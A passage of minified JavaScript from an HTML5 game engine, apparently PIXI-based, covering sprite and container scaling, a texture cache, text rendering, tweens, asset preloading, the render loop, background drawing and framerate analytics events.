            O(e.target), window.dirtyOnce = !0, window.onerror && window.onerror("Failure to load generated asset image: " + this.path + " > " + e.message, e.sourceURL, e.line)
        }

        function D(e, t) {
            var i;
            t || (i = e, LEGACY_COORD_SYSTEM && (i.prototype._x = 0, i.prototype._y = 0, Object.defineProperty(i.prototype, "x", {
                get: function() {
                    return this._x
                },
                set: function(e) {
                    this._x = e, this.position.x = e * (this.parent && this.parent.ratio || 1)
                }
            }), Object.defineProperty(i.prototype, "y", {
                get: function() {
                    return this._y
                },
                set: function(e) {
                    this._y = e, this.position.y = e * (this.parent && this.parent.ratio || 1)
                }
            }), i.prototype._ratio = void 0, i.prototype.lockRatio = !1, i.prototype.forceSetRatio = function(e) {
                if (this._ratio !== e)
                    if (!isNaN(e) && (e > 0 || -1 == e)) {
                        this._ratio = e, this.x = this.x, this.y = this.y;
                        for (var t = 0; t < this.children.length; t++) this.children[t].ratio = e;
                        this.setRatio && this.setRatio(e)
                    } else console.warn("Invalid value passed to Container forceSetRatio " + e)
            }, Object.defineProperty(i.prototype, "ratio", {
                get: function() {
                    return this._ratio
                },
                set: function(e) {
                    this._ratio === e || this.lockRatio || this.forceSetRatio(e)
                }
            }))), e.prototype.inside = function(e, t, i) {
                return !1
            }, LEGACY_COORD_SYSTEM && (e.prototype._addChildAt = e.prototype.addChildAt, e.prototype.addChildAt = function(e, t) {
                var i = this._addChildAt(e, t);
                return null != this.ratio && (e.ratio = this.ratio), i
            }, e.prototype._removeChildAt = e.prototype.removeChildAt, e.prototype.removeChildAt = function(e) {
                var t = this._removeChildAt(e);
                return t && this.ratio && (t.ratio = -1), t
            })
        }
        LEGACY_COORD_SYSTEM || (Object.defineProperty(i.DisplayObjectContainer.prototype, "dimensions", {
            get: function() {
                return new Point(this.width, this.height)
            },
            set: function(e) {
                this.width = e.x, this.height = e.y
            }
        }), i.DisplayObjectContainer.prototype.applyResolutionRecursive = function() {
            for (var e = 0; e < this.children.length; ++e) {
                var t = this.children[e];
                t && t.applyResolution && t.applyResolution(), t && t.applyResolutionRecursive && t.applyResolutionRecursive()
            }
        }, i.DisplayObjectContainer.prototype.getResolutionGlobal = function() {
            for (var e = this.resolution, t = this; t = t.parent;) e *= t.resolution;
            return e
        }, Object.defineProperty(i.DisplayObjectContainer.prototype, "resolution", {
            get: function() {
                return void 0 !== this._resolution ? this._resolution : 1
            },
            set: function(e) {
                this._resolution = e
            }
        }));
        var B = i.DisplayObjectContainer.expand(function() {
            return i.DisplayObjectContainer.call(this), L(this), this
        });
        B.prototype.cacheRender = function(e) {
            var t = this.getLocalBounds(),
                n = new i.Sprite(i.Texture.emptyTexture);
            n.worldTransform = this.worldTransform, n.anchor.x = -t.x / t.width, n.anchor.y = -t.y / t.height, e.save(), e.translate(-t.x + this.x, -t.y + this.y), e.globalAlpha = this.alpha;
            for (var r = 0, o = this.children.length; r < o; r++) {
                var a = this.children[r];
                a.cacheRender && a.visible && a.cacheRender(e)
            }
            e.restore()
        }, D(B), e.Container = B;
        var z = B.expand(function(e, t) {
            return B.call(this), this._width = e || 0, this._height = t || 0, Object.defineProperty(this, "width", {
                get: function() {
                    return this._width * this.scale.x
                },
                set: function(e) {
                    this._width = e / this.scale.x
                }
            }), Object.defineProperty(this, "height", {
                get: function() {
                    return this._height * this.scale.y
                },
                set: function(e) {
                    this._height = e / this.scale.y
                }
            }), this
        });
        e.ContainerFixedSize = z;
        var H = {};
        i.Texture.getScaled = function(e, t, n, r, o) {
            var a, s = e.path + ":" + t,
                l = H[s];
            l && !o || (e.isJSG ? (a = be[s]) || (a = e.draw({
                scale: t,
                forceCanvas: r
            })) : a = 1 === t ? e : I(e, t), 1 !== t && (a.path = s), LEGACY_COORD_SYSTEM ? texture = i.Texture.fromCanvas(a) : texture = i.Texture.fromCanvas(a, void 0, t), texture.floorCoordinates = n.floorCoordinates, l = {
                canvas: a,
                texture: texture,
                count: 0,
                ratio: t,
                path: s,
                timeToKill: 0
            }, H[s] = l);
            return l.count++, n._textureCache[s] = l, l
        };
        var N = 0,
            U = i.Sprite.expand(function(e, t) {
                return LEGACY_COORD_SYSTEM && (this._ratio = -1), this.image = e, this._textureCache = {}, void 0 === e.path && (e.path = "DynamicSprite:" + N++), LEGACY_COORD_SYSTEM ? e.isJSG ? i.Sprite.call(this, Texture.emptyTexture) : i.Sprite.call(this, this.getTexture(e, 1)) : (this.resolution = t || 1, e.isJSG ? i.Sprite.call(this, this.getTexture(e, this.getResolutionGlobal())) : i.Sprite.call(this, this.getTexture(e, 1))), L(this), this
            });
        LEGACY_COORD_SYSTEM || (U.prototype.applyResolution = function() {
            this.setTexture(this.getTexture(this.image, this.getResolutionGlobal(), !0))
        }), LEGACY_COORD_SYSTEM || (Object.defineProperty(U.prototype, "width", {
            get: function() {
                var e = this.texture.baseTexture.hasLoaded ? this.texture.frame.width : this.image.width || 1;
                return this.scale.x * e
            },
            set: function(e) {
                var t = this.texture.baseTexture.hasLoaded ? this.texture.frame.width : this.image.width || 1;
                this.scale.x = e / t, this._width = e
            }
        }), Object.defineProperty(U.prototype, "height", {
            get: function() {
                var e = this.texture.baseTexture.hasLoaded ? this.texture.frame.height : this.image.height || 1;
                return this.scale.y * e
            },
            set: function(e) {
                var t = this.texture.baseTexture.hasLoaded ? this.texture.frame.height : this.image.height || 1;
                this.scale.y = e / t, this._height = e
            }
        })), U.prototype.getTexture = function(e, t, n) {
            return i.Texture.getScaled(e, t, this, !1, n).texture
        }, LEGACY_COORD_SYSTEM || (U.fromCanvasContext = function(e, t, i) {
            var n = document.createElement("canvas");
            n.width = e, n.height = t;
            var r = n.getContext("2d");
            return i && i(r), new U(n)
        }), U.prototype.cacheRender = function(e) {
            e.save();
            this.texture.baseTexture.source;
            e.globalAlpha = e.globalAlpha * this.alpha;
            var t = this.texture.baseTexture.source;
            this.image.isJSG && (t = this.image.draw({
                forceCanvas: !0
            }));
            var n = this.position.x - t.width * this.anchor.x,
                r = this.position.y - t.height * this.anchor.y;
            if (16777215 !== this.tint) {
                var o = getNewCanvasObject();
                i.CanvasTinter.tintWithPerPixelInner(t, o, this.tint, {
                    x: 0,
                    y: 0,
                    width: t.width,
                    height: t.height
                }), e.drawImage(o, n, r), releaseCanvas(o)
            } else e.drawImage(t, n, r);
            this.image.isJSG && releaseCanvas(t), e.restore()
        }, U.prototype.floorCoordinates = !0;
        setInterval(function() {
            for (var e in H) {
                var t = H[e];
                0 == t.count && 1 !== t.ratio && t.ratio !== stage.ratio && (t.timeToKill--, t.timeToKill <= 0 && (t.canvas.getContext && releaseCanvas(t.canvas), t.texture.destroy(!0), delete H[e]))
            }
        }, 100), U.prototype.cleanTextureCache = function(e) {
            var t = 1;
            for (var i in -1 == e && (t = 1e3), this._textureCache) {
                var n = this._textureCache[i];
                n.count--, n.timeToKill = t, delete this._textureCache[i]
            }
        }, LEGACY_COORD_SYSTEM && (U.prototype._y = 0, Object.defineProperty(U.prototype, "y", {
            get: function() {
                return this._y
            },
            set: function(e) {
                this._y = e, this.position.y = e * this._ratio
            }
        }), U.prototype._x = 0, Object.defineProperty(U.prototype, "x", {
            get: function() {
                return this._x
            },
            set: function(e) {
                this._x = e, this.position.x = e * this._ratio
            }
        }), U.prototype.lockRatio = !1, U.prototype.redraw = function() {
            this.setTexture(this.getTexture(this.image, this.ratio, !0))
        }, U.prototype.forceSetRatio = function(e, t) {
            if (this._ratio !== e || t)
                if (!isNaN(e) && (e > 0 || -1 == e)) {
                    this._ratio = e, this.cleanTextureCache(e), -1 === e ? this.setTexture(Texture.emptyTexture) : (this.setTexture(this.getTexture(this.image, e)), this.x = this.x, this.y = this.y), this.setRatio && this.setRatio(e);
                    for (var i = 0; i < this.children.length; i++) this.children[i].ratio = e
                } else console.warn("Invalid value passed to Sprite forceSetRatio " + e)
        }, Object.defineProperty(U.prototype, "ratio", {
            get: function() {
                return this._ratio
            },
            set: function(e) {
                this.lockRatio || this.forceSetRatio(e)
            }
        })), U.fromSheet = function(e, t) {
            return e.frame = t, new U(e.image)
        }, D(U, !0), e.Sprite = U;
        var W = U.expand(function(e, i, n) {
            i = i || e.height, n = n || e.height;
            var r = e.width / i >> 0,
                o = e.height / n >> 0;
            this.length = r * o, this.images = [];
            for (var a = 0; a < this.length; a++) {
                var s = a % r >> 0,
                    l = a / r >> 0;
                this.images.push(t.utils.clipImage(e, s * i, l * n, i, n, 0, 0, i, n))
            }
            U.call(this, this.images[0])
        });
        W.prototype._frame = 0, W.prototype.images = [], Object.defineProperty(W.prototype, "frame", {
            get: function() {
                return this._frame
            },
            set: function(e) {
                (e = Math.floor(e)) !== this.frame && (this._frame = e % this.length, this.image = this.images[this._frame], LEGACY_COORD_SYSTEM ? -1 != this.ratio && this.setTexture(this.getTexture(this.image, this.ratio)) : this.setTexture(this.getTexture(this.image, 1)), window.dirtyOnce = !0)
            }
        }), e.Sheet = W;
        var j = i.Sprite.expand(function(e) {
                i.Sprite.call(this, e)
            }),
            Y = j.prototype._renderWebGL;
        j.prototype._renderWebGL = function(e) {
            this._dirtyTexture && (this._dirtyTexture = !1, i.updateWebGLTexture(this.texture.baseTexture, e.gl)), Y.call(this, e)
        }, e.TextureSprite = j, t.reportTextures = function() {
            console.log("Total Texture Pixels:", i.__totalPixels)
        };
        var V = {},
            Z = [];
        e.Text2 = i.Sprite.expand(function(e, t) {
            var n, r, o = this;
            null == e && (e = ""), (t = t || {}).weight = t.weight || "300", t.size = t.size || 30, t.fill = t.fill || "#000000";
            var a = 0,
                s = 0,
                l = 0,
                h = 1;

            function d() {
                var s = (e.translated || e) + ":" + t.size * h + ":" + a + ":" + JSON.stringify(t);
                if (s != r) {
                    var l = V[s],
                        d = V[r];
                    if (d && (d.count--, 0 == d.count && (Z.push(d.text), delete V[r])), !l) {
                        var c = Z.pop(),
                            u = c ? c.style : {};
                        for (var f in t) u[f] = t[f];
                        t.dropShadow ? u.dropShadowDistance = (t.dropShadowDistance || 6) * h : (u.dropShadowDistance = 0, u.dropShadow = void 0);
                        var p = Math.max((t.size - a) * h, .1);
                        u._font = (t.italic ? "italic " : "") + t.weight + " " + p + "px " + (t.font || '"Helvetica Neue","Trebuchet MS", Helvetica, sans-serif'), l = V[s] = {
                            text: c || new i.Text(e.toString(), u),
                            localizedString: e,
                            count: 0,
                            ratio: h
                        }, c && (c.text = e.toString())
                    }
                    l.count++, r = s, l.text.updateText(), n = l.text, o.setTexture(n.texture), window.dirtyOnce = !0
                }
            }

            function c() {
                a = 0;
                var e = !0;
                if (LEGACY_COORD_SYSTEM && (e = -1 != o.ratio), e && (d(), t.maxWidth)) {
                    var i = 1;
                    for (LEGACY_COORD_SYSTEM && (i = o.ratio); n.texture.frame.width > t.maxWidth * i && t.size - a > 1;) a += 2, t.size - a < 1 && (a = t.size - 1), d()
                }
            }
            o.getContent = function() {
                return d(), n
            }, i.Sprite.call(o, Texture.emptyTexture), o.setText = function(t) {
                e.toString() !== t.toString() && (null == t && (t = ""), e = t, c())
            }, o.onLanguageChange = function() {
                e = Host.Localize.Translate(e), c()
            }, o.updateStyle = function(e) {
                var i = !1;
                for (var n in e) t[n] != e[n] && (i = !0, t[n] = e[n]);
                i && c()
            }, o.setStyle = function(e) {
                o.updateStyle(e)
            }, LEGACY_COORD_SYSTEM || (o.applyResolution = function() {
                c()
            });
            s = 0, l = 0, h = 1;
            LEGACY_COORD_SYSTEM && (Object.defineProperty(o, "ratio", {
                get: function() {
                    return h
                },
                set: function(e) {
                    h === e && n || (h = e, o.position.x = s * h >> 0, o.position.y = l * h >> 0, c())
                }
            }), Object.defineProperty(o, "x", {
                get: function() {
                    return s
                },
                set: function(e) {
                    s = e, o.position.x = e * h >> 0
                }
            }), Object.defineProperty(o, "y", {
                get: function() {
                    return l
                },
                set: function(e) {
                    l = e, o.position.y = e * h >> 0
                }
            }), Object.defineProperty(o, "width", {
                get: function() {
                    return n || c(), o.scale.x * n.texture.frame.width
                },
                set: function(e) {
                    n || c(), o.scale.x = e / n.texture.frame.width, n._width = e
                }
            }), Object.defineProperty(o, "height", {
                get: function() {
                    return n || c(), o.scale.y * n.texture.frame.height
                },
                set: function(e) {
                    n || c(), o.scale.y = e / n.texture.frame.height, n._height = e
                }
            })), o.cacheRender = function(e) {
                e.drawImage(n.texture.baseTexture.source, o.position.x, o.position.y)
            }, d(), c()
        }), e.Text2.onLanguageChange = function() {
            for (k in V) {
                V[k].text.setText(Host.Localize.Translate(V[k].localizedString))
            }
            Host.Localize.UpdateChildren(t.stageContainer), t.emit("translate", {})
        }, e.Graphics = i.Graphics.expand(function() {
            return L(this), i.Graphics.call(this), this
        }), e.Rectangle = i.Rectangle, e.Rectangle.prototype.getPosition = function() {
            return new Point(this.x, this.y)
        }, e.Rectangle.prototype.getSize = function() {
            return new Point(this.width, this.height)
        }, e.Texture = i.Texture, e.RenderTexture = i.RenderTexture, e.Point = i.Point, e.BlendModes = i.blendModes;
        var q = 1e3 / 60,
            K = 1.7 * q,
            Q = 3.1 * q;

        function J(e, t, i, n, r) {
            if (!(e instanceof Function)) throw "timeout callback must be a function";
            t = t || 0, i = i || !1, n = n && n.constructor === Array ? n : [], r && r.constructor === Array ? 0 == r.length && (r = [a.DEF_GRP_NAME]) : r = r && "string" == typeof r ? [r] : [a.DEF_GRP_NAME], this.cb = e, this.cbParams = n, this.delayMS = 1e3 * t, this.originalDelayMS = this.delayMS, this.repeats = i, this.id = a.nextHandlerId++, this.frc = 0, J.timeouts[this.id] = this, a.addHandler(this, r)
        }
        J.timeouts = {}, J.clear = function(e) {
            if ("number" == typeof e && isFinite(e) && Math.round(e) === e) {
                var t = null;
                e in J.timeouts && (t = J.timeouts[e], delete J.timeouts[e], a.removeHandler(t))
            }
        }, J.tick = function() {
            var e = [];
            for (var t in J.timeouts) {
                (n = J.timeouts[t]).frc > 0 || n.tick() && e.push(t)
            }
            for (var i = 0; i < e.length; i++) {
                var n;
                t = e[i];
                if ((n = J.timeouts[t]) && (n.repeats || J.clear(parseInt(t)), void 0 !== n.cb)) try {
                    n.cb.apply(window, n.cbParams)
                } catch (e) {
                    window.onerror && window.onerror("Timeout.tick error: " + e.message, e.sourceURL, e.line, void 0, e)
                }
            }
        }, t.on("tick", J.tick, {
            freezeGroup: ENG_FRZ_GRP
        }), J.prototype.tick = function() {
            return this.delayMS -= q, this.delayMS <= 0 && (this.repeats && (this.delayMS = this.originalDelayMS + this.delayMS), !0)
        }, J.prototype.constructor = J, t.setTimeout = function(e, t, i, n) {
            return new J(e, t / 1e3, !1, i, n).id
        }, t.clearTimeout = function(e) {
            J.clear(e)
        }, t.setInterval = function(e, t, i, n) {
            return new J(e, t / 1e3, !0, i, n).id
        }, t.clearInterval = function(e) {
            J.clear(e)
        };
        var $ = function(e, t, i, n, r) {
            for (var o in i = null == i ? 1 : i, 1 != $.multiplier && (i *= $.multiplier), this.id = a.nextHandlerId++, this.frc = 0, this.tweenedProps = {}, this.offset = 1, this.method = n || $.easeout, this.length = 1e3 * i / (1e3 / 60), this.target = e, t) this.tweenedProps[o] = {
                start: e[o],
                end: t[o]
            };
            $.tweens[this.id] = this, r && r.constructor === Array ? 0 == r.length && (r = [a.DEF_GRP_NAME]) : r = r && "string" == typeof r ? [r] : [a.DEF_GRP_NAME], a.addHandler(this, r)
        };
        $.multiplier = 1, $.nextId = 1, $.prototype.call = function(e, t) {
            return e instanceof Function || console.warn("Tween callback parsed to .call is not a function", e), this.callback = e, this.callbackParams = t, this
        }, $.prototype.wait = function(e) {
            return this.delay = 1e3 * (e || 0) / (1e3 / 60), this
        }, $.prototype.tick = function() {
            if (this.delay > 0) return this.delay--, !1;
            for (var e in this.tweenedProps) {
                var t = this.tweenedProps[e];
                this.target[e] = this.method(t.start, t.end instanceof Function ? t.end() : t.end, this.offset / this.length)
            }
            return this.offset++, this.offset > this.length || void 0
        }, $.prototype.__complete = function() {
            for (var e in this.tweenedProps) this.target[e] = this.tweenedProps[e].end instanceof Function ? this.tweenedProps[e].end() : this.tweenedProps[e].end;
            if (this.callback) {
                var i = this;
                i.callback && t.once("animate", function() {
                    i.callback.apply(i.target, i.callbackParams || null)
                }, {
                    freezeGroup: ENG_FRZ_GRP
                })
            }
        }, $.prototype.complete = function() {
            $.complete(this)
        }, $.prototype.clear = function() {
            $.clear(this)
        }, $.tweens = {}, $.linear = $.linary = function(e, t, i) {
            return e + (t - e) * i
        }, $.easein = function(e, t, i) {
            return e + (t - e) * (1 - Math.sin(i * Math.PI / 2 + Math.PI / 2))
        }, $.easeout = function(e, t, i) {
            return e + (t - e) * Math.sin(i * Math.PI / 2)
        }, $.easeinout = function(e, t, i) {
            return e + (t - e) * ((Math.sin(i * Math.PI - Math.PI / 2) + 1) / 2)
        }, $.bounce = function(e, t, i) {
            return e + (t - e) * Math.sin(i * Math.PI)
        }, $.tick = function() {
            var e = [];
            for (var t in $.tweens) {
                (n = $.tweens[t]).frc > 0 || n.tick() && e.push(t)
            }
            for (var i = 0; i < e.length; i++) {
                if ((t = e[i]) in $.tweens) {
                    var n = $.tweens[t];
                    window.dirtyOnce = !0, delete $.tweens[t], a.removeHandler(n), n.__complete()
                }
            }
        }, t.on("tick", $.tick, {
            freezeGroup: ENG_FRZ_GRP
        }), $.complete = function() {
            for (var e = 0; e < arguments.length; e++) {
                var t = arguments[e];
                for (var i in $.tweens)
                    if (i in $.tweens) {
                        var n = $.tweens[i];
                        n.target != t && n != t || (window.dirtyOnce = !0, delete $.tweens[n.id], a.removeHandler(n), n.__complete())
                    }
            }
        }, $.clear = function() {
            for (var e = 0; e < arguments.length; e++) {
                var t = arguments[e];
                for (var i in $.tweens)
                    if (i in $.tweens) {
                        var n = $.tweens[i];
                        n.target != t && n != t || (n.callback = void 0, delete $.tweens[n.id], a.removeHandler(n))
                    }
            }
        }, $.activeTweensCount = function() {
            var e = 0;
            for (var t in $.tweens) {
                $.tweens[t].frc > 0 || e++
            }
            return e
        }, e.Tween = $;
        var ee = getNewCanvasObject();
        ee.height = ee.width = 1, ee.path = "Image wrapper for load failure";
        var te = {},
            ie = {},
            ne = e.fetch;

        function re(e) {
            if (!e) return console.warn("You tried to load an image with an empty path"), ee;
            if (void 0 === te[e]) {
                if (ne) return "string" == typeof e && console.info('"%s" not found in preloadCache. Calling native fetch().', e), ne.apply(this, arguments);
                "string" == typeof e ? console.error('You can only use the embed method in conjuction with preload for > "%s"', e) : console.error("Native fetch() missing:", arguments)
            }
            return te[e]
        }
        e.embed = function(e) {
            return re(e)
        }, e.fetch = function(e) {
            return ie[e] ? ie[e] : re.apply(this, arguments)
        }, e.preload = function() {
            var e = 0,
                i = 0,
                n = [],
                r = [];

            function o(t) {
                window.dirtyOnce = !0, e--;
                for (var o = 0; o < n.length; o++) n[o](i, e);
                0 === e && function() {
                    for (; r.length;) r.shift()();
                    r = void 0, n = void 0
                }()
            }

            function a(t, n) {
                if (!ie[t]) {
                    var r, a = embeddedAssets[t];
                    if (a && a instanceof Array) delete embeddedAssets[t], n ? (r = getJSGImageWrapper(t, a[0], a[1])).ignoreScaleCache = n : (e++, i++, r = getJSGImageWrapper(t, a[0], a[1], o)), ie[t] = r;
                    else s(t)
                }
            }

            function s(t) {
                if (t && "null" !== t) {
                    var n, r = ("//" != (n = t).substring(0, 2) && "http" != n.substring(0, 4) && (n = vpath + n), n);
                    if (void 0 === te[t]) {
                        ie[t], e++, i++;
                        var a, s, l, h, d, c = embeddedAssets[t];
                        if (ie[t] || c) ie[t] || c instanceof Array ? function(e) {
                            function t() {
                                o()
                            }
                            var i = embeddedAssets[e],
                                n = ie[e] || getJSGImageWrapper(e, i[0], i[1]),
                                r = te[e] = n.draw();
                            (r.complete || r.getContext) && r.width && r.height || r.isCanvas ? t() : (r.onload = t, r.onerror = function(t) {
                                te[e] = ee, window.onerror && window.onerror("Failure to generate image (JSG): " + e + " - " + t.message, t.sourceURL, t.line), o()
                            }), r.path = e
                        }(t) : (h = t, d = new Image, te[h] = d, d.onload = function() {
                            o()
                        }, d.onerror = function(e) {
                            te[h] = ee, window.onerror && window.onerror("Failure to generate image (Native): " + h + " - " + e.message, e.sourceURL, e.line), o()
                        }, d.path = h, d.src = embeddedAssets[h]), delete embeddedAssets[t];
                        else switch (r.substring(r.lastIndexOf("."))) {
                            case ".wav":
                            case ".mp3":
                                throw new Error("You should not preload sounds: " + r);
                            default:
                                a = t, s = r, (l = new Image).crossOrigin = "anonymous", l.onload = function() {
                                    te[a] = l, o()
                                }, l.onerror = function(e) {
                                    te[a] = ee, o()
                                }, l.path = a, l.src = s
                        }
                    }
                }
            }

            function l(t, n) {
                e++, i++, Host.Preferences["Get" + t](n, o)
            }

            function h(n, r, a) {
                e++, i++, t.data._load(r, a, n, o)
            }
            var d, c = /[^A-Za-z]embed\(\s*["']([^)]+?)["']\s*\)/g,
                u = /[^A-Za-z]fetch\(\s*["']([^)]+?)["']\s*[),](true|\!0)?/g,
                f = /[^A-Za-z]Host.Preferences.Quick([A-Za-z]+)\(\s*["'](.+?)["']\s*\)/g,
                p = /[^A-Za-z]XS\.data\.add([A-Za-z]+)\(\s*["']([^"']+)["']\s*(?:\)|,(?!\s*["']))/g,
                g = /[^A-Za-z]XS\.data\.add([A-Za-z]+)WithLocalKey\(\s*[\"|\']([^"']+)["']\s*,\s*["']([^"']+)["']\s*[,)]/g;

            function v(e) {
                for (var t = e.toString(); d = c.exec(t);) s(d[1]);
                for (; d = u.exec(t);) a(d[1], void 0 !== d[2]);
                for (; d = f.exec(t);) l(d[1], d[2]);
                for (; d = p.exec(t);) h(d[1], d[2], d[2]);
                for (; d = g.exec(t);) h(d[1], d[2], d[3]);
                v.systemVars || (v.systemVars = !0, l("Bool", "xs.muteStateOverload.v1"), l("Bool", "xs.muteSound.v1"), l("Bool", "xs.muteMusic.v1"), l("Bool", "instant.hasInstalledShortcut.v1"))
            }
            v.systemVars = !1, i = 0, e++;
            for (var m, y = 0; y < arguments.length; y++) void 0 !== (m = arguments[y]) && (m instanceof Function ? (r.push(m), v(m)) : s(m));
            return setTimeout(function() {
                    o()
                }, 1),
                function(e) {
                    n && n.push(e)
                }
        };
        var oe = (new Date).getTime();
        window.dirty = !1, window.dirtyOnce = !1;
        ! function e() {
            var i = (new Date).getTime();
            if (s()) return oe = i, void requestAnimationFrame(e);
            if (t.emit("animate"), i - oe > 5e3 && (oe = i), i - oe > q && (oe += q, t.emit("tick"), i - oe > K))
                for (oe += q, t.emit("tick"); i - oe > Q;) oe += q, t.emit("tick");
            (t.dirty || window.dirty || window.dirtyOnce || 0 !== $.activeTweensCount()) && (t.emit("render"), window.dirtyOnce = !1, t.renderer.render(t.stageContainer)), requestAnimationFrame(e)
        }(), window.performanceTest = function() {
            for (var e = (new Date).getTime(), i = 0; i < 1e3; i++) t.renderer.render(t.stageContainer);
            console.log((new Date).getTime() - e)
        }, setTimeout(function() {
            var e = (new Date).getTime(),
                t = (new Date).getTime(),
                i = {};
            requestAnimationFrame(function n() {
                var r = (new Date).getTime(),
                    o = r - t;
                if (i[o] = (i[o] || 0) + 1, t = r, r - e < 6e4) requestAnimationFrame(n);
                else {
                    var a = 0,
                        s = 0;
                    for (var l in i) a += l * i[l], s += i[l];
                    var h = Math.round(1e3 / (a / s));
                    ga("send", "event", Config.id, "Performance", "Avg Framerate", h), h < 30 && ga("send", "event", Config.id, "Performance", "Below 30 Framerate", h), h < 15 && ga("send", "event", Config.id, "Performance", "Below 15 Framerate", h), h < 10 && ga("send", "event", Config.id, "Performance", "Below 10 Framerate", h), i = t = null
                }
            })
        }, 2e3), e.gameHeight = height, e.gameWidth = width, LEGACY_COORD_SYSTEM ? (e.stage = new B, L(e.stage)) : (e.stage = new z, t.stage = e.stage, L(e.stage)), stage.hitArea = new i.Rectangle(0, -1e4, 1e5, 1e5), stage.interactive = !0, stage.touchstart = function() {}, t.stageContainer.addChild(stage), stage.orientation = "landscape", stage.orientationMode = "dynamic";
        var ae = getNewCanvasObject(),
            se = ae.getContext("2d"),
            le = new j(Texture.emptyTexture),
            he = new i.Graphics;
        stage.addChild(le), stage.addChild(he);
        var de = 0,
            ce = 0,
            ue = {
                top: 0,
                bottom: 0,
                left: 0,
                right: 0
            };

        function fe(e, t, i) {
            return void 0 === e ? e : e.toString() === e && "%" == e[e.length - 1] ? t * (parseInt(e.substring(0, e.length - 1)) / 100) : e * i
        }
        stage.background = {
            color: "#000000",
            gradient: void 0,
            texture: void 0,
            callback: void 0,
            disabled: !1
        };
        var pe = {};

        function ge(e) {
            le.texture.destroy(!0), e.target && le.setTexture(new Texture.fromCanvas(e.target)), window.dirtyOnce = !0, O(e.target)
        }

        function ve(e) {
            var t = e.error || e;
            window.dirtyOnce = !0, window.onerror && window.onerror("Failure to generate background: " + t.message, t), O(e.target)
        }
        stage.background.embellish = function(i) {
            if (pe != i) {
                pe = i;
                for (var n = [], r = 0; r < i.length; r++) n.push(i[r].path);
                n.push(function() {
                    for (var e = 0; e < i.length; e++) i[e].image = embed(i[e].path);
                    stage.background.callback = function(e, n) {
                        for (var r = 0; r < i.length; r++) {
                            var o = i[r],
                                a = height / targetWidth * t.devicePixelRatio,
                                s = o.image.width * a,
                                l = o.image.height * a,
                                h = 0,
                                d = 0,
                                c = fe(o.left, e.width, a),
                                u = fe(o.right, e.width, a),
                                f = fe(o.top, e.width, a),
                                p = fe(o.bottom, e.width, a);
                            void 0 !== c && void 0 !== u && (s = e.width - 5 - c - u), void 0 !== c && (h = c), void 0 !== u && (h = e.width - u - s), void 0 !== f && void 0 !== p && (l = e.height - 5 - f - p), void 0 !== f && (d = f), void 0 !== p && (d = e.height - 5 - p - l), h += fe(o.offsetX, s, 1) || 0, d += fe(o.offsetY, l, 1) || 0, n.drawImage(o.image, h, d, s, l)
                        }
                    }, ye(!0)
                }), preload.apply(e, n)
            }
        }, t.getScreenshot = function() {
            stage.updateTransform();
            var e = getNewCanvasObject();
            e.style.width = (e.width = width * t.devicePixelRatio) / t.devicePixelRatio + "px", e.style.height = (e.height = height * t.devicePixelRatio) / t.devicePixelRatio + "px";
            var i = {
                context: e.getContext("2d"),
                maskManager: null,
                scaleMode: null,
                smoothProperty: null,
                currentBlendMode: 0
            };
            return stage._renderCanvas(i), e
        }, t.getTintedTexture = i.CanvasTinter.getTintedTexture, stage.background.drawBackground = function(e, i, n, r, o, a) {
            if (e.fillStyle = stage.background.color, e.fillRect(0, 0, i, n), r) {
                var s;
                switch (r.type) {
                    case "radial":
                        var l = null == r.multiplier ? 1 : r.multiplier,
                            h = null == r.verticalOffset ? .5 : r.verticalOffset;
                        s = e.createRadialGradient(i / 2, n * h, 0, i / 2, n * h, Math.max(i / 2, n / 2) * l);
                        break;
                    case "linear":
                        s = e.createLinearGradient(i * (r.width || 0), n, 0, 0);
                        break;
                    default:
                        throw "Unsupported radial format"
                }
                for (var d = 0; d < r.stops.length; d++) s.addColorStop.apply(s, r.stops[d]);
                e.fillStyle = s, e.fillRect(0, 0, i, n)
            }
            if (a && a(ae, e), o) {
                if (!o.scaled) {
                    var c = o.scaled = getNewCanvasObject();
                    c.width = Math.ceil(o.width * t.devicePixelRatio / 2), c.height = Math.ceil(o.height * t.devicePixelRatio / 2), c.getContext("2d").drawImage(o, 0, 0, o.width, o.height, 0, 0, c.width, c.height)
                }
                var u = e.createPattern(o.scaled, "repeat");
                e.fillStyle = u, e.fillRect(0, 0, i, n)
            }
            t.emit("backgroundredraw", {
                context: e
            })
        };
        var me = new Image;

        function ye(e) {
            (e || de != width || ce != height || ue.top != (t.styles.margins.top || 0) || ue.bottom != (t.styles.margins.bottom || 0) || ue.left != (t.styles.margins.left || 0) || ue.right != (t.styles.margins.right || 0)) && t.initComplete && (de = width, ce = height, ue.top = t.styles.margins.top || 0, ue.bottom = t.styles.margins.bottom || 0, ue.left = t.styles.margins.left || 0, ue.right = t.styles.margins.right || 0, stage.background.disabled ? (le.parent && stage.removeChild(le), he.clear(), he.beginFill(t.stageContainer.backgroundColor, 1), LEGACY_COORD_SYSTEM ? he.drawRect(0, 0, width * t.devicePixelRatio, height * t.devicePixelRatio) : he.drawRect(0, 0, t.stage.width, t.stage.height), he.endFill()) : (he.parent && stage.removeChild(he), LEGACY_COORD_SYSTEM ? (ae.width = width * t.devicePixelRatio + 5, ae.height = height * t.devicePixelRatio + 5) : (ae.width = t.stage.width + 5, ae.height = t.stage.height + 5), stage.background.drawBackground(se, ae.width, ae.height, stage.background.gradient, stage.background.texture, stage.background.callback), Host.dataUrlsSupported ? (me, (me = new Image).onload = ge, me.onerror = ve, me.src = ae.toDataURL(), ae.width = ae.height = 1) : (le.texture.destroy(!0), le.setTexture(new Texture.fromCanvas(ae))), le.y = -t.styles.margins.top * t.devicePixelRatio, window.dirtyOnce = !0))
        }
        stage.background.refresh = ye, window.targetWidth = 2732, window.targetHeight = 2048, window.forceRatio = !1;
        var we = 0;

        function Se() {
            var e = document.documentElement.clientHeight;
            return t.is.iOS && !t.is.facebookInstant && (e = window.innerHeight || e), Math.max(e, 100)
        }

        function xe() {
            return Math.max(document.documentElement.clientWidth, 100)
        }
        var be = {},
            _e = -1;

        function Te(e) {
            if (-1 != e && e != _e) {
                for (x in _e = e, be) delete be[x];
                for (var i in ie) {
                    var n = ie[i];
                    if (!n.ignoreScaleCache) {
                        var r = n.draw({
                            scale: e,
                            instantDraw: t.initComplete
                        });
                        i = i + ":" + e;
                        r.isJSGCache = !0, r.ratio = e, r.path = i, be[i] = r
                    }
                }
            }
        }
        t.initComplete = !1;
        var Ce = 0,
            Re = 0,
            Me = 0,
            Ee = 0,
            Ae = 0,
            Pe = 0,
            Le = 0,
            Ge = z.expand(function(e, i) {
                var n = z.call(this, e, i);
